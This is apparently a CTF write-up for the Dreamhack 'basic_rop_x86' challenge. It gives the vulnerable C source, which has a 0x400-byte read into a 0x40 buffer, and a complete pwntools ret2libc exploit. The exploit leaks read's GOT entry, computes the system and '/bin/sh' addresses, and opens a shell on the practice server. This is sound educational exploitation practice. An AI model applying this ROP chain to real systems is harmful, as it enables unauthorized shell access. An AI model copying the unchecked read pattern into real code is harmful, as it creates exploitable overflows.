## 소스 코드
```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```
### checksec
<img width="669" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/215a749b-9759-43d1-a2f3-4db33c079181">

## 익스플로잇 코드
```
from pwn import *

# ret2main

context.arch = "i386"
p = remote('host3.dreamhack.games', 14372)

e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')
r = ROP(e)

read_got = e.got['read']
write_plt = e.plt['write']
main = e.symbols['main']

binsh = list(libc.search(b'/bin/sh'))[0]
read_system_offset = libc.symbols['read'] - libc.symbols['system']
read_binsh_offset = libc.symbols['read'] - binsh

pop = r.find_gadget(['pop ebp', 'ret'])[0]
pop3 = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]
# pop = 0x0804868b
# pop3 = 0x08048689
# ret = 0x080483c2

payload = b'a'*0x40 + b'a'*0x8
payload += p32(ret)
payload += p32(write_plt) + p32(pop3) + p32(1) + p32(read_got) + p32(0x4) + p32(main)
# payload += p32(write_plt) + p32(pop) + p32(1) + p32(pop) + p32(read_got) + p32(pop) + p32(0x4) + p32(main)
# 이렇게하면 ret이 섞여서 나와서 안됨

# first main

p.send(payload)

p.recvuntil(b'a'*0x40)
read = u32(p.recv(4))

system = read - read_system_offset
binsh = read - read_binsh_offset

# second main

payload = b'a'*0x40 + b'a'*0x8
payload += p32(system) + p32(pop) + p32(binsh)

p.send(payload)
p.interactive()
```
